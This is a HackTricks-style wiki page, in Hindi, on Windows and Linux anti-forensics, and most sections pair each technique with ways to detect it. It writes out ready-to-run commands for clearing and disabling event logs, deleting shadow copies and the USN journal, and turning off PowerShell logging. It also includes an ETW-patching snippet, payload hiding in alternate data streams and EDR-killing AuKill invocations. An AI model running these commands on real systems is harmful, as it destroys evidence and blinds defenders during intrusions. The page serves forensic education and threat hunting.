# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

एक हमलावर **फाइलों के टाइमस्टैम्प को बदलने** में रुचि रख सकता है ताकि उसे पकड़ा न जा सके।\
यह संभव है कि MFT के अंदर `$STANDARD_INFORMATION` \_\_ और \_\_ `$FILE_NAME` में टाइमस्टैम्प पाए जाएं।

दोनों विशेषताओं में 4 टाइमस्टैम्प होते हैं: **संशोधन**, **पहुँच**, **निर्माण**, और **MFT रजिस्ट्रि संशोधन** (MACE या MACB)।

**Windows explorer** और अन्य उपकरण **`$STANDARD_INFORMATION`** से जानकारी दिखाते हैं।

### TimeStomp - Anti-forensic Tool

यह उपकरण **`$STANDARD_INFORMATION`** के अंदर टाइमस्टैम्प जानकारी को **संशोधित** करता है **लेकिन** **`$FILE_NAME`** के अंदर की जानकारी को **नहीं**। इसलिए, **संदिग्ध** **गतिविधि** को **पहचानना** संभव है।

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) NTFS (Windows NT फाइल सिस्टम) की एक विशेषता है जो वॉल्यूम परिवर्तनों का ट्रैक रखती है। [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) उपकरण इन परिवर्तनों की जांच करने की अनुमति देता है।

![](<../../images/image (801).png>)

पिछली छवि **उपकरण** द्वारा दिखाया गया **आउटपुट** है जहाँ देखा जा सकता है कि कुछ **परिवर्तन किए गए** थे।

### $LogFile

**फाइल सिस्टम में सभी मेटाडेटा परिवर्तनों को लॉग किया जाता है** जिसे [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) के रूप में जाना जाता है। लॉग की गई मेटाडेटा एक फ़ाइल में रखी जाती है जिसका नाम `**$LogFile**` है, जो NTFS फाइल सिस्टम के रूट डायरेक्टरी में स्थित है। [LogFileParser](https://github.com/jschicht/LogFileParser) जैसे उपकरण का उपयोग इस फ़ाइल को पार्स करने और परिवर्तनों की पहचान करने के लिए किया जा सकता है।

![](<../../images/image (137).png>)

फिर से, उपकरण के आउटपुट में यह देखना संभव है कि **कुछ परिवर्तन किए गए** थे।

उसी उपकरण का उपयोग करके यह पहचानना संभव है कि **कब टाइमस्टैम्प संशोधित किए गए** थे:

![](<../../images/image (1089).png>)

- CTIME: फ़ाइल का निर्माण समय
- ATIME: फ़ाइल का संशोधन समय
- MTIME: फ़ाइल का MFT रजिस्ट्रि संशोधन
- RTIME: फ़ाइल का पहुँच समय

### `$STANDARD_INFORMATION` और `$FILE_NAME` तुलना

संदिग्ध संशोधित फ़ाइलों की पहचान करने का एक और तरीका दोनों विशेषताओं पर समय की तुलना करना है और **असंगतियों** की तलाश करना है।

### Nanoseconds

**NTFS** टाइमस्टैम्प की **सटीकता** **100 नैनोसेकंड** है। इसलिए, 2010-10-10 10:10:**00.000:0000 जैसे टाइमस्टैम्प वाली फ़ाइलें **बहुत संदिग्ध** हैं।

### SetMace - Anti-forensic Tool

यह उपकरण दोनों विशेषताओं `$STARNDAR_INFORMATION` और `$FILE_NAME` को संशोधित कर सकता है। हालाँकि, Windows Vista से, इस जानकारी को संशोधित करने के लिए एक लाइव OS की आवश्यकता होती है।

## Data Hiding

NFTS एक क्लस्टर और न्यूनतम जानकारी के आकार का उपयोग करता है। इसका मतलब है कि यदि एक फ़ाइल एक और आधे क्लस्टर का उपयोग करती है, तो **बचा हुआ आधा कभी उपयोग नहीं किया जाएगा** जब तक फ़ाइल को हटा नहीं दिया जाता। फिर, इस स्लैक स्पेस में **डेटा छिपाना** संभव है।

ऐसे उपकरण हैं जैसे slacker जो इस "छिपे हुए" स्थान में डेटा छिपाने की अनुमति देते हैं। हालाँकि, `$logfile` और `$usnjrnl` का विश्लेषण दिखा सकता है कि कुछ डेटा जोड़ा गया था:

![](<../../images/image (1060).png>)

फिर, FTK Imager जैसे उपकरणों का उपयोग करके स्लैक स्पेस को पुनर्प्राप्त करना संभव है। ध्यान दें कि इस प्रकार के उपकरण सामग्री को ओब्स्क्यूरेट या यहां तक कि एन्क्रिप्टेड रूप में सहेज सकते हैं।

## UsbKill

यह एक उपकरण है जो **USB** पोर्ट में किसी भी परिवर्तन का पता लगाते ही **कंप्यूटर को बंद** कर देगा।\
इसका पता लगाने का एक तरीका चल रहे प्रक्रियाओं का निरीक्षण करना और **प्रत्येक चल रहे पायथन स्क्रिप्ट की समीक्षा करना** है।

## Live Linux Distributions

ये डिस्ट्रीब्यूशन **RAM** मेमोरी के अंदर **निष्पादित** होते हैं। इन्हें केवल तभी पता लगाया जा सकता है जब **NTFS फाइल सिस्टम को लिखने की अनुमति के साथ माउंट किया गया हो**। यदि इसे केवल पढ़ने की अनुमति के साथ माउंट किया गया है, तो घुसपैठ का पता लगाना संभव नहीं होगा।

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

कई विंडोज लॉगिंग विधियों को अक्षम करना संभव है ताकि फॉरेंसिक जांच को बहुत कठिन बनाया जा सके।

### Disable Timestamps - UserAssist

यह एक रजिस्ट्री कुंजी है जो उपयोगकर्ता द्वारा चलाए गए प्रत्येक निष्पादन योग्य की तारीखों और घंटों को बनाए रखती है।

UserAssist को अक्षम करने के लिए दो चरणों की आवश्यकता होती है:

1. दो रजिस्ट्री कुंजी सेट करें, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` और `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, दोनों को शून्य पर सेट करें ताकि संकेत मिले कि हम UserAssist को अक्षम करना चाहते हैं।
2. अपने रजिस्ट्री उप-ट्री को साफ करें जो `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` की तरह दिखते हैं।

### Disable Timestamps - Prefetch

यह उन अनुप्रयोगों के बारे में जानकारी सहेजता है जो Windows सिस्टम के प्रदर्शन में सुधार के लक्ष्य के साथ निष्पादित होते हैं। हालाँकि, यह फॉरेंसिक प्रथाओं के लिए भी उपयोगी हो सकता है।

- `regedit` निष्पादित करें
- फ़ाइल पथ का चयन करें `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- दोनों `EnablePrefetcher` और `EnableSuperfetch` पर राइट-क्लिक करें
- प्रत्येक पर संशोधित करें ताकि मान 1 (या 3) से 0 में बदल जाए
- पुनरारंभ करें

### Disable Timestamps - Last Access Time

जब भी एक फ़ोल्डर NTFS वॉल्यूम से Windows NT सर्वर पर खोला जाता है, तो सिस्टम प्रत्येक सूचीबद्ध फ़ोल्डर पर **एक टाइमस्टैम्प फ़ील्ड को अपडेट करने के लिए समय लेता है**, जिसे अंतिम पहुँच समय कहा जाता है। एक भारी उपयोग किए गए NTFS वॉल्यूम पर, यह प्रदर्शन को प्रभावित कर सकता है।

1. रजिस्ट्री संपादक (Regedit.exe) खोलें।
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` पर जाएं।
3. `NtfsDisableLastAccessUpdate` की तलाश करें। यदि यह मौजूद नहीं है, तो इस DWORD को जोड़ें और इसका मान 1 पर सेट करें, जो प्रक्रिया को अक्षम कर देगा।
4. रजिस्ट्री संपादक बंद करें, और सर्वर को पुनरारंभ करें।

### Delete USB History

सभी **USB डिवाइस प्रविष्टियाँ** Windows रजिस्ट्री में **USBSTOR** रजिस्ट्री कुंजी के तहत संग्रहीत होती हैं जिसमें उप कुंजियाँ होती हैं जो तब बनाई जाती हैं जब आप अपने पीसी या लैपटॉप में USB डिवाइस लगाते हैं। आप इस कुंजी को यहाँ पा सकते हैं `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`। **इसे हटाने से** आप USB इतिहास को हटा देंगे।\
आप यह सुनिश्चित करने के लिए [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) उपकरण का भी उपयोग कर सकते हैं कि आपने उन्हें हटा दिया है (और उन्हें हटाने के लिए)।

एक और फ़ाइल जो USB के बारे में जानकारी सहेजती है वह फ़ाइल `setupapi.dev.log` है जो `C:\Windows\INF` के अंदर है। इसे भी हटाया जाना चाहिए।

### Disable Shadow Copies

**सूची** शैडो कॉपियों के साथ `vssadmin list shadowstorage`\
**हटाएं** उन्हें चलाकर `vssadmin delete shadow`

आप GUI के माध्यम से भी उन्हें हटा सकते हैं [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) में प्रस्तावित चरणों का पालन करके।

शैडो कॉपियों को अक्षम करने के लिए [यहाँ से चरण](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Windows स्टार्ट बटन पर क्लिक करने के बाद टेक्स्ट सर्च बॉक्स में "services" टाइप करके सेवाएँ प्रोग्राम खोलें।
2. सूची में "Volume Shadow Copy" खोजें, इसे चुनें, और फिर राइट-क्लिक करके प्रॉपर्टीज़ पर जाएं।
3. "Startup type" ड्रॉप-डाउन मेनू से Disabled चुनें, और फिर Apply और OK पर क्लिक करके परिवर्तन की पुष्टि करें।

यह भी संभव है कि रजिस्ट्री `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` में शैडो कॉपी में कॉपी किए जाने वाले फ़ाइलों की कॉन्फ़िगरेशन को संशोधित किया जाए।

### Overwrite deleted files

- आप एक **Windows उपकरण** का उपयोग कर सकते हैं: `cipher /w:C` यह सिफारिश करेगा कि सिफर C ड्राइव के अंदर उपलब्ध अप्रयुक्त डिस्क स्थान से किसी भी डेटा को हटा दे।
- आप [**Eraser**](https://eraser.heidi.ie) जैसे उपकरणों का भी उपयोग कर सकते हैं।

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> "Windows Logs" का विस्तार करें --> प्रत्येक श्रेणी पर राइट-क्लिक करें और "Clear Log" चुनें
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- सेवाओं के अनुभाग के अंदर "Windows Event Log" सेवा को अक्षम करें
- `WEvtUtil.exec clear-log` या `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Windows 10/11 और Windows Server के हाल के संस्करण **समृद्ध PowerShell फॉरेंसिक कलाकृतियों** को बनाए रखते हैं
`Microsoft-Windows-PowerShell/Operational` (इवेंट 4104/4105/4106) के तहत।
हमलावर इन्हें ऑन-द-फ्लाई अक्षम या मिटा सकते हैं:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
रक्षक को उन रजिस्ट्री कुंजियों में परिवर्तनों और PowerShell घटनाओं के उच्च मात्रा में हटाने की निगरानी करनी चाहिए।

### ETW (Windows के लिए इवेंट ट्रेसिंग) पैच

एंडपॉइंट सुरक्षा उत्पाद ETW पर बहुत निर्भर करते हैं। एक लोकप्रिय 2024 बचाव विधि है कि मेमोरी में `ntdll!EtwEventWrite`/`EtwEventWriteFull` को पैच किया जाए ताकि हर ETW कॉल `STATUS_SUCCESS` लौटाए बिना घटना को उत्पन्न किए।
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (e.g. `EtwTiSwallow`) PowerShell या C++ में वही प्राइमिटिव लागू करते हैं। चूंकि पैच **प्रोसेस-लोकल** है, अन्य प्रोसेस के अंदर चल रहे EDRs इसे मिस कर सकते हैं।  
Detection: `ntdll` को मेमोरी में और डिस्क पर तुलना करें, या यूजर-मोड से पहले हुक करें।

### Alternate Data Streams (ADS) Revival

2023 में मैलवेयर अभियान (जैसे **FIN12** लोडर्स) को पारंपरिक स्कैनरों की नज़र से बाहर रहने के लिए ADS के अंदर दूसरे चरण के बाइनरी स्टेज करते हुए देखा गया है:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
`dir /R`, `Get-Item -Stream *`, या Sysinternals `streams64.exe` के साथ स्ट्रीम्स की गणना करें। होस्ट फ़ाइल को FAT/exFAT या SMB के माध्यम से कॉपी करने से छिपी स्ट्रीम हटा दी जाएगी और इसका उपयोग जांचकर्ताओं द्वारा पेलोड को पुनर्प्राप्त करने के लिए किया जा सकता है।

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver अब रैंसमवेयर घुसपैठ में **एंटी-फॉरेंसिक्स** के लिए नियमित रूप से उपयोग किया जाता है। ओपन-सोर्स टूल **AuKill** एक साइन किया हुआ लेकिन कमजोर ड्राइवर (`procexp152.sys`) लोड करता है ताकि EDR और फॉरेंसिक सेंसर को **एन्क्रिप्शन और लॉग विनाश से पहले** निलंबित या समाप्त किया जा सके:
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
ड्राइवर को बाद में हटा दिया जाता है, जिससे न्यूनतम अवशेष रह जाते हैं।  
निवारण: Microsoft कमजोर-ड्राइवर ब्लॉकलिस्ट (HVCI/SAC) सक्षम करें, और उपयोगकर्ता-लिखने योग्य पथों से कर्नेल-सेवा निर्माण पर अलर्ट करें।

---

## Linux एंटी-फॉरेंसिक्स: स्वयं-पैचिंग और क्लाउड C2 (2023–2025)

### पहचान कम करने के लिए स्वयं-पैचिंग किए गए सेवाएँ (Linux)  
विपक्षी अक्सर एक सेवा को उसके शोषण के तुरंत बाद "स्वयं-पैच" करते हैं ताकि पुनः-शोषण को रोका जा सके और कमजोरियों पर आधारित पहचान को दबाया जा सके। विचार यह है कि कमजोर घटकों को नवीनतम वैध अपस्ट्रीम बाइनरी/JARs के साथ प्रतिस्थापित किया जाए, ताकि स्कैनर होस्ट को पैच किया हुआ रिपोर्ट करें जबकि स्थायीता और C2 बनी रहे।

उदाहरण: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
- पोस्ट-शोषण, हमलावरों ने Maven Central (repo1.maven.org) से वैध JARs प्राप्त किए, ActiveMQ इंस्टॉलेशन में कमजोर JARs को हटा दिया, और ब्रोकर को पुनः प्रारंभ किया।  
- इससे प्रारंभिक RCE बंद हो गया जबकि अन्य पांव (cron, SSH कॉन्फ़िग परिवर्तन, अलग C2 इम्प्लांट) बनाए रखे गए।

संचालनात्मक उदाहरण (चित्रात्मक)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensic/hunting tips
- अस्थायी बाइनरी/JAR प्रतिस्थापन के लिए सेवा निर्देशिकाओं की समीक्षा करें:
- Debian/Ubuntu: `dpkg -V activemq` और फ़ाइल हैश/पथों की तुलना करें रिपॉ मिरर्स के साथ।
- RHEL/CentOS: `rpm -Va 'activemq*'`
- उन JAR संस्करणों की तलाश करें जो डिस्क पर हैं और पैकेज प्रबंधक के स्वामित्व में नहीं हैं, या प्रतीकात्मक लिंक जो बैंड से बाहर अपडेट किए गए हैं।
- टाइमलाइन: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` से ctime/mtime को समझौता विंडो के साथ सहसंबंधित करें।
- शेल इतिहास/प्रक्रिया टेलीमेट्री: प्रारंभिक शोषण के तुरंत बाद `curl`/`wget` के `repo1.maven.org` या अन्य कलाकृति CDN के सबूत।
- परिवर्तन प्रबंधन: यह मान्य करें कि "पैच" किसने लागू किया और क्यों, केवल यह नहीं कि एक पैच किया गया संस्करण मौजूद है।

### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
देखे गए व्यापार कौशल ने कई दीर्घकालिक C2 पथों और एंटी-विश्लेषण पैकेजिंग को जोड़ा:
- पासवर्ड-संरक्षित PyInstaller ELF लोडर जो सैंडबॉक्सिंग और स्थैतिक विश्लेषण को बाधित करते हैं (जैसे, एन्क्रिप्टेड PYZ, अस्थायी निष्कर्षण `/_MEI*` के तहत)।
- संकेतक: `strings` हिट जैसे `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`।
- रनटाइम कलाकृतियाँ: `/tmp/_MEI*` या कस्टम `--runtime-tmpdir` पथों पर निष्कर्षण।
- हार्डकोडेड OAuth बियरर टोकन का उपयोग करके Dropbox-समर्थित C2
- नेटवर्क मार्कर: `api.dropboxapi.com` / `content.dropboxapi.com` के साथ `Authorization: Bearer <token>`।
- सर्वर कार्यभार से Dropbox डोमेन के लिए आउटबाउंड HTTPS के लिए प्रॉक्सी/नेटफ्लो/ज़ीक/सुरिकाटा में शिकार करें जो सामान्यतः फ़ाइलें समन्वयित नहीं करते हैं।
- टनलिंग के माध्यम से समानांतर/बैकअप C2 (जैसे, Cloudflare Tunnel `cloudflared`), यदि एक चैनल अवरुद्ध हो जाए तो नियंत्रण बनाए रखना।
- होस्ट IOCs: `cloudflared` प्रक्रियाएँ/इकाइयाँ, `~/.cloudflared/*.json` पर कॉन्फ़िगरेशन, Cloudflare किनारों के लिए आउटबाउंड 443।

### Persistence and “hardening rollback” to maintain access (Linux examples)
हमलावर अक्सर आत्म-पैचिंग को टिकाऊ पहुंच पथों के साथ जोड़ते हैं:
- क्रोन/एनाक्रोन: प्रत्येक `/etc/cron.*/` निर्देशिका में `0anacron` स्टब में संपादन के लिए आवधिक निष्पादन।
- शिकार:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH कॉन्फ़िगरेशन हार्डनिंग रोलबैक: रूट लॉगिन सक्षम करना और निम्न-विशिष्ट खातों के लिए डिफ़ॉल्ट शेल को बदलना।
- रूट लॉगिन सक्षम करने के लिए शिकार:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# "yes" या अत्यधिक अनुमति सेटिंग्स जैसे ध्वज मान
```
- सिस्टम खातों पर संदिग्ध इंटरैक्टिव शेल के लिए शिकार (जैसे, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- डिस्क पर गिराए गए यादृच्छिक, छोटे नाम वाले बीकन कलाकृतियाँ (8 वर्णमाला वर्ण) जो क्लाउड C2 से भी संपर्क करती हैं:
- शिकार:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

रक्षा करने वालों को इन कलाकृतियों को बाहरी एक्सपोजर और सेवा पैचिंग घटनाओं के साथ सहसंबंधित करना चाहिए ताकि प्रारंभिक शोषण को छिपाने के लिए उपयोग की जाने वाली एंटी-फॉरेंसिक आत्म-उपचार को उजागर किया जा सके।

## References

- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (March 2023)
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (June 2024)
https://redcanary.com/blog/etw-patching-detection

- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
